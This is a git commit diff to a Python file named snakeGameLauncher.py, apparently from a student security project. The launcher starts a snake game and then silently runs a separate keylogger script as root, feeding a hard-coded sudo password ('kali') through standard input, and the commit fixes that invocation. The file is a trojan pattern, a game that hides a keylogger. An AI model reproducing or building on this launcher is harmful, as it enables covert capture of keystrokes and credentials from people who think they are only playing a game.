4379a417e9bc0358fe75cf9a00cd46af36b45289
d-c-a-m-p <atcampbell@eckerd.edu>
2026-01-21 22:14:12 -0500

    Update snakeGameLauncher.py

--- snakeGameLauncher.py
+++ snakeGameLauncher.py
@@ -6,10 +6,10 @@ subprocess.run(["python3", "snakeGame.py"])
 # build terminal command to run keylogger
 # sudo is needed for root privileges 
 # -S makes terminal read from a standard input
-command = ["sudo", "-S", "CSkeyloggerproject.py"]
+command = ["sudo", "-S", "python3", "CSkeyloggerproject.py"]
 try: 
     # runs command and waits for input
-    process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE, text = True)
+    process = subprocess.Popen(command, stdin=subprocess.PIPE, text = True)
     process.communicate(input="kali")
 except:
     process.kill()
